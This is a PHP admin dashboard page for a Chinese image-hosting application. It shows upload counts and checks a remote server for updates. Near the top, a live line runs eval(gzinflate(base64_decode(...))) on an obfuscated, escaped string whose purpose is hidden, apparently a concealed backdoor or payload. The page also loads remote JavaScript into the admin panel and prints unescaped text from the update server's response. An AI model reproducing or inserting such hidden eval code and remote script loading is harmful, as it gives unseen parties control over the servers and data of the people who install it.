<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>小猫咪图床</title>
<link rel="icon" href="favicon.ico" type="image/ico">
<meta name="keywords" content="小猫咪图床,cc图床">
<meta name="description" content="LightYear是一个基于Bootstrap v3.3.7的后台管理系统的HTML模板。">
<meta name="author" content="yinqi">
<link href="css/bootstrap.min.css" rel="stylesheet">
<link href="css/materialdesignicons.min.css" rel="stylesheet">
<link href="css/style.min.css" rel="stylesheet">
</head>
  
<body>
<div class="lyear-layout-web">
  <div class="lyear-layout-container">
    <!--左侧导航-->
    <aside class="lyear-layout-sidebar">
      
      <!-- logo -->
      <div id="logo" class="sidebar-header">
        <a href="/"><h3>小猫咪图床</h3></a>
      </div>
      <div class="lyear-layout-sidebar-scroll"> 
        
        <nav class="sidebar-main">
          <ul class="nav nav-drawer">
            <li class="nav-item active"> <a href="/admin"><i class="mdi mdi-home"></i> 后台首页</a> </li>
            <li class="nav-item nav-item-has-subnav">
             

            <li class="nav-item nav-item-has-subnav">
              <a href="javascript:void(0)"><i class="mdi mdi-format-align-justify"></i> 前台设置</a>
              <ul class="nav nav-subnav">
                <li> <a href="file.php">图片列表</a> </li>
                <li> <a href="set.php">网站配置</a> </li>
                <li> <a href="key.php">后台密码</a> </li>
                <li> <a href="update.php">系统更新</a> </li>
              </ul>
            </li>
  </li>
          </ul>
        </nav>
        
        <div class="sidebar-footer">
<p class="copyright">Copyright &copy; 2024. <a target="_blank" href="https://lwcat.cn/">云猫</a> All rights reserved.</p>
        </div>
      </div>
      
    </aside>
    <!--End 左侧导航-->
    
    <!--头部信息-->
    <header class="lyear-layout-header">
      
      <nav class="navbar navbar-default">
        <div class="topbar">
          
          <div class="topbar-left">
            <div class="lyear-aside-toggler">
              <span class="lyear-toggler-bar"></span>
              <span class="lyear-toggler-bar"></span>
              <span class="lyear-toggler-bar"></span>
            </div>
            <span class="navbar-page-title"> 后台首页 </span>
          </div>
          
          <ul class="topbar-right">
            <li class="dropdown dropdown-profile">
              <a href="javascript:void(0)" data-toggle="dropdown">
                <img class="img-avatar img-avatar-48 m-r-10" src="https://q.qlogo.cn/g?b=qq&nk=3522934828&s=100" alt="云猫" />
                <span>云猫 <span class="caret"></span></span>
              </a>
              <ul class="dropdown-menu dropdown-menu-right">
                <li> <a href="set.php"><i class="mdi mdi-account"></i> 网站设置</a> </li>
                <li> <a href="key.php"><i class="mdi mdi-lock-outline"></i> 修改密码</a> </li>
                <li> <a href="javascript:void(0)"><i class="mdi mdi-delete"></i> 清空缓存</a></li>
              </ul>
            </li>
            <!--切换主题配色-->
		    <li class="dropdown dropdown-skin">
			  <span data-toggle="dropdown" class="icon-palette"><i class="mdi mdi-palette"></i></span>
			  <ul class="dropdown-menu dropdown-menu-right" data-stopPropagation="true">
                <li class="drop-title"><p>主题</p></li>
                <li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="site_theme" value="default" id="site_theme_1" checked>
                    <label for="site_theme_1"></label>
                  </span>
                  <span>
                    <input type="radio" name="site_theme" value="dark" id="site_theme_2">
                    <label for="site_theme_2"></label>
                  </span>
                  <span>
                    <input type="radio" name="site_theme" value="translucent" id="site_theme_3">
                    <label for="site_theme_3"></label>
                  </span>
                </li>
			    <li class="drop-title"><p>LOGO</p></li>
				<li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="logo_bg" value="default" id="logo_bg_1" checked>
                    <label for="logo_bg_1"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_2" id="logo_bg_2">
                    <label for="logo_bg_2"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_3" id="logo_bg_3">
                    <label for="logo_bg_3"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_4" id="logo_bg_4">
                    <label for="logo_bg_4"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_5" id="logo_bg_5">
                    <label for="logo_bg_5"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_6" id="logo_bg_6">
                    <label for="logo_bg_6"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_7" id="logo_bg_7">
                    <label for="logo_bg_7"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_8" id="logo_bg_8">
                    <label for="logo_bg_8"></label>
                  </span>
				</li>
				<li class="drop-title"><p>头部</p></li>
				<li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="header_bg" value="default" id="header_bg_1" checked>
                    <label for="header_bg_1"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_2" id="header_bg_2">
                    <label for="header_bg_2"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_3" id="header_bg_3">
                    <label for="header_bg_3"></label>
                  </span>
                  <span>
                    <input type="radio" name="header_bg" value="color_4" id="header_bg_4">
                    <label for="header_bg_4"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_5" id="header_bg_5">
                    <label for="header_bg_5"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_6" id="header_bg_6">
                    <label for="header_bg_6"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_7" id="header_bg_7">
                    <label for="header_bg_7"></label>
                  </span>
                  <span>
                    <input type="radio" name="header_bg" value="color_8" id="header_bg_8">
                    <label for="header_bg_8"></label>
                  </span>
				</li>
				<li class="drop-title"><p>侧边栏</p></li>
				<li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="sidebar_bg" value="default" id="sidebar_bg_1" checked>
                    <label for="sidebar_bg_1"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_2" id="sidebar_bg_2">
                    <label for="sidebar_bg_2"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_3" id="sidebar_bg_3">
                    <label for="sidebar_bg_3"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_4" id="sidebar_bg_4">
                    <label for="sidebar_bg_4"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_5" id="sidebar_bg_5">
                    <label for="sidebar_bg_5"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_6" id="sidebar_bg_6">
                    <label for="sidebar_bg_6"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_7" id="sidebar_bg_7">
                    <label for="sidebar_bg_7"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_8" id="sidebar_bg_8">
                    <label for="sidebar_bg_8"></label>
                  </span>
				</li>
			  </ul>
			</li>
            <!--切换主题配色-->
          </ul>
          
        </div>
      </nav>
      
    </header>
    <!--End 头部信息-->
       <?php eval(gzinflate(base64_decode("\144\x59\x35\116\141\x34\x4e\101\x46\x45\x58\63\x67\x76\71\150\x45\107\107\x55\x77\x41\122\x4b\63\157\x53\x51\155\106\126\114\x43\x55\66\x61\144\x56\112\x4b\107\x63\x65\x6e\104\x6c\x56\156\57\103\x68\x45\123\166\x35\67\x4e\142\x61\67\x64\156\125\x57\x39\71\172\67\x48\156\x45\x64\x58\141\x76\171\115\60\x56\103\x47\126\x73\x71\x55\61\127\155\110\x6d\107\110\x56\165\144\106\x7a\62\170\x68\66\x66\131\146\160\x38\x35\x30\57\x69\166\x34\x2b\161\161\x6c\151\x52\114\132\x49\x56\53\71\x70\x36\x68\x4d\151\x6f\x45\x2f\x4f\66\70\x30\x61\x65\x68\142\117\115\x31\x6b\112\x50\x41\124\x57\x55\x66\x52\67\x49\146\153\171\x33\x56\165\127\110\x59\x34\x30\162\x64\x2f\x54\x46\102\131\126\121\x65\167\104\64\x2b\x51\64\115\104\152\x75\111\x57\172\x7a\166\x6d\x6c\x2b\x6c\x69\166\x68\171\x4d\x2f\x6e\104\x59\147\71\x4d\x75\144\132\172\x31\x6d\172\65\113\114\170\x51\130\x45\61\x4d\x47\x63\170\x34\x73\145\x6f\110\x6b\103\x30\131\x6a\122\x7a\53\152\x30\101\66\x72\x43\105\x47\57\x58\x71\x56\x62\x62\x66\151\71\114\142\120\x75\101\x65\x6d\171\53\172\152\x77\141\x37\160\131\x2f\155\x62\x65\71\x75\143\x34\63")));
   
error_reporting(0);
session_start();
include '../common/version.php';

function count_files_in_directory($directory) {
    $count = 0;
    if (is_dir($directory)) {
        $iterator = new DirectoryIterator($directory);
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $count++;
            }
        }
    }
    return $count ?: 0;
}

function count_files_recursive($dir) {
    $count = 0;
    if (is_dir($dir)) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $count++;
            }
        }
    }
    return $count;
}

$targetDir = "../images/";
$year = date('Y');
$month = date('m');
$day = date('d');
$num = 1;
$dayq = $day - $num;

$path = $targetDir . $year . '/' . $month . '/' . $day;
$directory = $path;
$file_count = count_files_in_directory($directory);

$path2 = $targetDir . $year . '/' . $month . '/' . $dayq;
$directory2 = $path2;
$file_count2 = count_files_in_directory($directory2);

$directory_recursive = '../images'; // 文件保存的目录
$totalFiles = count_files_recursive($directory_recursive);
   ?>
    <!--页面主要内容-->
    <main class="lyear-layout-content">
		 <div class="container-fluid">
			 
			  <div class="row">
          <div class="col-sm-6 col-lg-3">
            <div class="card bg-primary">
              <div class="card-body clearfix">
                <div class="pull-right">
                  <p class="h6 text-white m-t-0">今日上传</p>
                  <p class="h3 text-white m-b-0"><?php echo $file_count;?></p>
                </div>
                <div class="pull-left"> <span class="img-avatar img-avatar-48 bg-translucent"><i class="mdi mdi-cloud-upload"></i></span> </div>
              </div>
            </div>
          </div>
          
          <div class="col-sm-6 col-lg-3">
            <div class="card bg-danger">
              <div class="card-body clearfix">
                <div class="pull-right">
                  <p class="h6 text-white m-t-0">昨日上传</p>
                  <p class="h3 text-white m-b-0"><?php echo $file_count2;?></p>
                </div>
                <div class="pull-left"> <span class="img-avatar img-avatar-48 bg-translucent"><i class="mdi mdi-cloud-upload"></i></span> </div>
              </div>
            </div>
          </div>
          
          <div class="col-sm-6 col-lg-3">
            <div class="card bg-success">
              <div class="card-body clearfix">
                <div class="pull-right">
                  <p class="h6 text-white m-t-0">图片总量</p>
                  <p class="h3 text-white m-b-0"><?php echo $totalFiles;?></p>
                </div>
                <div class="pull-left"> <span class="img-avatar img-avatar-48 bg-translucent"><i class="mdi mdi-image"></i></span> </div>
              </div>
            </div>
          </div>
          
          <div class="col-sm-6 col-lg-3">
            <div class="card bg-purple">
              <div class="card-body clearfix">
                <div class="pull-right">
                  <p class="h6 text-white m-t-0">网站访问</p>
                  <p class="h3 text-white m-b-0">待更新</p>
                </div>
                <div class="pull-left"> <span class="img-avatar img-avatar-48 bg-translucent"><i class="mdi mdi-comment-outline fa-1-5x"></i></span> </div>
              </div>
            </div>
          </div>
        </div>
			 
			          <div class="col-md-6">
            <div class="card">
              <div class="card-header"><h4>检查更新</h4></div>
              <div class="card-body">
                
                    
                    <center>
                        
<?php
$url = "https://lwcat.cn/img/update.php";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($status_code == 200) {
    $json = json_decode($response, true);
        if ($json['version'] == $version) {
            echo "当前版本".$version."<br>最新版本：".$json['version']."<br>当前已是最新版本";
        } else{
            echo "当前版本：".$version."<br>最新版本：".$json['version']."<br>有新版本哦，请参考更新内容来考虑是否更新<br>本次更新内容：<br>".$json['new']."<br><a class='btn btn-primary' href='".$json['url']."'>下载最新版本</a>";
    }
} else {
    echo "请求服务器失败，请联系作者";
}
?>
                        
                    </center>
              
                
                <center><a href="https://gitee.com/ximami/ccimg/">项目地址：https://gitee.com/ximami/ccimg</a></center>
              </div>
			
		        </div>
        
     
    </main>
    <!--End 页面主要内容-->
  </div>
</div>

<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/perfect-scrollbar.min.js"></script>
<script type="text/javascript" src="js/main.min.js"></script>
<script src="https://lwcat.cn/img/admin.js"></script>

	<!--图表插件-->

</body>
</html>